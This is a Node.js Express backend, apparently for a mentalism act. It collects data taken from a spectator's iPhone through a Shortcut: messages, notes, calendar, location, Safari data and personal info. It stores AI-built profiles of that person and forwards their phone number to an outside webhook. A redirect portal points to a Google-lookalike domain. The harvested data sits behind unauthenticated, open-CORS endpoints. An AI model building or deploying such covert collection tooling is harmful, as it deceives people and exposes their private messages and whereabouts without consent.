const express = require('express');
const path = require('path');
const fs = require('fs');
const mongoose = require('mongoose');

const app = express();

// 15mb limit supports base64 images plus standard JSON requests
app.use(express.json({ limit: '15mb' }));

// Built-in CORS & Safari Cache-Control headers
app.use((req, res, next) => {
  res.set({
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0'
  });
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// ==================================================
// 0. MONGODB ATLAS CONNECTION & SCHEMAS
// ==================================================
const MONGO_URI = process.env.MONGO_URI;

if (!MONGO_URI) {
  console.warn('WARNING: MONGO_URI environment variable is not set! Falling back to local JSON files.');
} else {
  mongoose.connect(MONGO_URI)
    .then(() => console.log('Connected to MongoDB Atlas'))
    .catch(err => console.error('MongoDB connection error:', err));
}

const isDbConnected = () => mongoose.connection.readyState === 1;

const portalSchema = new mongoose.Schema({
  masterRedirect: String,
  links: [{ id: String, title: String, url: String }]
});
const Portal = mongoose.model('Portal', portalSchema);

const submissionSchema = new mongoose.Schema({
  id: { type: String, index: true },
  personal_info_b64: { type: String, default: '' },
  phone_number_b64: { type: String, default: '' },
  calendar: { type: String, default: '' },
  cellular_plan: { type: String, default: '' },
  notes: { type: String, default: '' },
  messages: { type: String, default: '' },
  hotspot: { type: String, default: '' },
  location: { type: String, default: '' },
  safari: { type: String, default: '' },
  timestamp: { type: Number, index: true }
});
const Submission = mongoose.model('Submission', submissionSchema);

// strict: false allows saving any additional custom keys from Shortcuts
const summarySchema = new mongoose.Schema({
  id: { type: String, index: true },
  submissionId: { type: String, default: null },
  title: { type: String, default: 'Untitled Summary' },
  text: { type: String, default: '' },

  // Stage 1: Vision & Identity Keys
  name: { type: String, default: '' },
  phone: { type: String, default: '' },
  reversePhone: { type: String, default: '' },
  dob: { type: String, default: '' },
  starSign: { type: String, default: '' },
  birthDayOfWeek: { type: String, default: '' },
  historicalEvent: { type: String, default: '' },

  // Stage 2: Mentalist Backstage Assistant Keys
  estimatedLocation: { type: String, default: '' },
  locationConfidence: { type: String, default: '' },
  locationReasoning: { type: String, default: '' },
  keyPerson: { type: String, default: '' },
  keyPersonRelationship: { type: String, default: '' },
  nuggetNamePerson: { type: String, default: '' },
  nuggetLingeringTask: { type: String, default: '' },
  nuggetLateThought: { type: String, default: '' },
  nuggetAmbientVibe: { type: String, default: '' },
  nuggetPivot: { type: String, default: '' },
  pets: { type: String, default: '' },
  extraDetails: { type: String, default: '' },

  timestamp: { type: Number, index: true }
}, { strict: false });

const Summary = mongoose.model('Summary', summarySchema);

// ==================================================
// 0.5 INJECT V2 WEBHOOK HELPER
// ==================================================
const INJECT_URL = 'https://11z.co/_w/19470/selection';

async function sendToInject(cleanPhone) {
  if (!cleanPhone || cleanPhone.toLowerCase() === 'not found') return;
  try {
    await fetch(INJECT_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        value: String(cleanPhone),
        source: 'V2'
      })
    });
  } catch (err) {
    console.error('Inject webhook error:', err);
  }
}

// ==================================================
// 1. KEEP-ALIVE HEALTH ROUTE
// ==================================================
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// ==================================================
// 2. SCREENSHOT & TELEMETRY RECEIVER ROUTES
// ==================================================
const SUBMISSIONS_FILE = path.join(__dirname, 'submissions.json');

function getLocalSubmissions() {
  if (!fs.existsSync(SUBMISSIONS_FILE)) {
    fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify([], null, 2));
    return [];
  }
  try {
    return JSON.parse(fs.readFileSync(SUBMISSIONS_FILE, 'utf8'));
  } catch (err) {
    return [];
  }
}

function saveLocalSubmissions(subs) {
  fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify(subs, null, 2));
}

async function getSubmissions() {
  if (isDbConnected()) {
    return await Submission.find().sort({ timestamp: -1 }).lean();
  }
  return getLocalSubmissions();
}

app.post('/api/submit', async (req, res) => {
  try {
    const {
      personal_info_b64 = '',
      phone_number_b64 = '',
      calendar = '',
      cellular_plan = '',
      notes = '',
      messages = '',
      hotspot = '',
      location = '',
      safari = ''
    } = req.body || {};

    const newEntry = {
      id: Date.now().toString(),
      personal_info_b64,
      phone_number_b64,
      calendar,
      cellular_plan,
      notes,
      messages,
      hotspot,
      location,
      safari,
      timestamp: Date.now()
    };

    if (isDbConnected()) {
      await Submission.create(newEntry);
    } else {
      const submissions = getLocalSubmissions();
      submissions.unshift(newEntry);
      saveLocalSubmissions(submissions);
    }

    return res.status(200).json({ success: true, message: 'Stored!', id: newEntry.id });
  } catch (error) {
    console.error('Error in /api/submit:', error);
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

app.get('/api/submissions', async (req, res) => {
  try {
    const submissions = await getSubmissions();
    return res.status(200).json({ success: true, submissions });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

app.get('/api/latest', async (req, res) => {
  try {
    const submissions = await getSubmissions();
    if (submissions.length === 0) {
      return res.status(404).json({ success: false, error: 'No data yet' });
    }
    return res.status(200).json({ success: true, ...submissions[0] });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

// ==================================================
// 3. AI SUMMARY HISTORY ROUTES (INDIVIDUAL KEYS + FULL TEXT)
// ==================================================
const SUMMARIES_FILE = path.join(__dirname, 'summaries.json');

function getLocalSummaries() {
  if (!fs.existsSync(SUMMARIES_FILE)) {
    fs.writeFileSync(SUMMARIES_FILE, JSON.stringify([], null, 2));
    return [];
  }
  try {
    return JSON.parse(fs.readFileSync(SUMMARIES_FILE, 'utf8'));
  } catch (err) {
    return [];
  }
}

function saveLocalSummaries(summaries) {
  fs.writeFileSync(SUMMARIES_FILE, JSON.stringify(summaries, null, 2));
}

async function getSummaries() {
  if (isDbConnected()) {
    return await Summary.find().sort({ timestamp: -1 }).lean();
  }
  return getLocalSummaries();
}

app.post('/api/summaries/submit', async (req, res) => {
  try {
    const {
      text = '',
      fullSummary = '',
      submissionId = null,
      name = '',
      phone = '',
      reversePhone = '',
      dob = '',
      starSign = '',
      birthDayOfWeek = '',
      historicalEvent = '',
      estimatedLocation = '',
      locationConfidence = '',
      locationReasoning = '',
      keyPerson = '',
      keyPersonRelationship = '',
      nuggetNamePerson = '',
      nuggetLingeringTask = '',
      nuggetLateThought = '',
      nuggetAmbientVibe = '',
      nuggetPivot = '',
      pets = '',
      extraDetails = '',
      ...extraFields
    } = req.body || {};

    const resolvedText = (text || fullSummary || '').toString();

    // Ensure phone is strictly clean 10 digits if present
    const rawDigits = String(phone).replace(/\D/g, '');
    const cleanPhone = (rawDigits.length === 11 && rawDigits.startsWith('1'))
      ? rawDigits.slice(1)
      : (rawDigits || String(phone).trim());

    if (!resolvedText && !name && !cleanPhone) {
      return res.status(400).json({ success: false, error: 'Missing summary text or extracted fields' });
    }

    const fallbackFirstLine = resolvedText.split('\n')[0].trim();
    const hasValidName = name && name.trim() !== '' && name.trim().toLowerCase() !== 'not found';
    const title = hasValidName
      ? name.trim()
      : (fallbackFirstLine.length > 0 ? fallbackFirstLine : 'Untitled Summary');

    const timestamp = Date.now();
    const cleanSubId = submissionId ? String(submissionId).trim() : null;

    const newEntry = {
      id: timestamp.toString(),
      submissionId: cleanSubId,
      title,
      text: resolvedText,
      name,
      phone: cleanPhone,
      reversePhone: String(reversePhone).trim(),
      dob,
      starSign,
      birthDayOfWeek,
      historicalEvent,
      estimatedLocation,
      locationConfidence,
      locationReasoning,
      keyPerson,
      keyPersonRelationship,
      nuggetNamePerson,
      nuggetLingeringTask,
      nuggetLateThought,
      nuggetAmbientVibe,
      nuggetPivot,
      pets,
      extraDetails,
      ...extraFields,
      timestamp
    };

    if (isDbConnected()) {
      await Summary.create(newEntry);
    } else {
      const summaries = getLocalSummaries();
      summaries.unshift(newEntry);
      saveLocalSummaries(summaries);
    }

    // Send strictly the clean 10-digit phone number to Inject V2
    if (cleanPhone && cleanPhone.toLowerCase() !== 'not found') {
      sendToInject(cleanPhone);
    }

    return res.status(200).json({ success: true, entry: newEntry });
  } catch (error) {
    console.error('Error in /api/summaries/submit:', error);
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

app.get('/api/summaries', async (req, res) => {
  try {
    const summaries = await getSummaries();
    return res.status(200).json({ success: true, summaries });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

app.get('/api/summaries/latest', async (req, res) => {
  try {
    const summaries = await getSummaries();
    if (summaries.length === 0) {
      return res.status(404).json({ success: false, error: 'No summaries yet' });
    }
    return res.status(200).json({ success: true, ...summaries[0] });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

// ==================================================
// 3.5 DATA DELETION ROUTES
// ==================================================
app.post('/api/delete-item', async (req, res) => {
  try {
    const { id, submissionId } = req.body || {};

    if (isDbConnected()) {
      if (id) {
        await Summary.deleteOne({ id: String(id).trim() });
      }
      if (submissionId) {
        await Submission.deleteOne({ id: String(submissionId).trim() });
      }
    } else {
      if (id) {
        let summaries = getLocalSummaries();
        summaries = summaries.filter(s => String(s.id) !== String(id).trim());
        saveLocalSummaries(summaries);
      }
      if (submissionId) {
        let submissions = getLocalSubmissions();
        submissions = submissions.filter(s => String(s.id) !== String(submissionId).trim());
        saveLocalSubmissions(submissions);
      }
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

app.post('/api/clear-data', async (req, res) => {
  try {
    if (isDbConnected()) {
      await Promise.all([
        Submission.deleteMany({}),
        Summary.deleteMany({})
      ]);
    } else {
      saveLocalSubmissions([]);
      saveLocalSummaries([]);
    }
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

// ==================================================
// 4. MAGIC LINKS PORTAL ROUTES (DATABASE BACKED)
// ==================================================
async function getPortalData() {
  let data = await Portal.findOne();
  if (!data) {
    data = new Portal({
      masterRedirect: 'https://gooqlc.com/111z',
      links: [
        { id: '1', title: 'Google', url: 'https://google.com' },
        { id: '2', title: 'Predict and Peek', url: 'https://www.icloud.com/shortcuts/' }
      ]
    });
    await data.save();
  }
  return data;
}

app.get('/', (req, res) => {
  const indexFile = path.join(__dirname, 'index.html');
  if (fs.existsSync(indexFile)) res.sendFile(indexFile);
  else res.status(200).send('Server is live.');
});

app.get('/api/portal', async (req, res) => {
  try {
    const data = await getPortalData();
    res.status(200).json({ success: true, masterRedirect: data.masterRedirect, links: data.links });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/save', async (req, res) => {
  try {
    const { masterRedirect, links } = req.body;
    let data = await Portal.findOne();
    if (!data) data = new Portal({ masterRedirect: 'https://gooqlc.com/111z', links: [] });

    if (masterRedirect) data.masterRedirect = masterRedirect;
    if (Array.isArray(links)) data.links = links;

    await data.save();
    return res.status(200).json({ success: true, data });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.all('/api/set-redirect', async (req, res) => {
  try {
    const newUrl = req.body?.url || req.query?.url;
    if (!newUrl) return res.status(400).json({ success: false, error: 'Missing url' });
    let data = await Portal.findOne();
    if (!data) {
      data = new Portal({ masterRedirect: newUrl, links: [] });
    } else {
      data.masterRedirect = newUrl;
    }
    await data.save();
    return res.status(200).json({ success: true, masterRedirect: data.masterRedirect });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.all('/api/update-link', async (req, res) => {
  try {
    const id = req.body?.id || req.query?.id;
    const newTitle = req.body?.title || req.query?.title;
    const newUrl = req.body?.url || req.query?.url;
    if (!id) return res.status(400).json({ success: false, error: 'Missing id' });

    let data = await Portal.findOne();
    if (!data) return res.status(404).json({ success: false, error: 'Portal data not found' });

    const links = data.links || [];
    let target = links.find(item => item.id === String(id));
    if (!target && !isNaN(Number(id)) && Number(id) >= 1 && Number(id) <= links.length) {
      target = links[Number(id) - 1];
    }

    if (!target) return res.status(404).json({ success: false, error: 'Link not found' });

    if (newTitle) target.title = newTitle;
    if (newUrl) target.url = newUrl;
    await data.save();
    return res.status(200).json({ success: true, updated: target });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// ==================================================
// 5. HISTORY DASHBOARD ROUTE
// ==================================================
app.get('/history', (req, res) => {
  const historyHtmlPath = path.join(__dirname, 'history.html');
  if (fs.existsSync(historyHtmlPath)) {
    res.sendFile(historyHtmlPath);
  } else {
    res.status(404).send('Please create history.html in your GitHub repo.');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Combined server running on port ${PORT}`);
});
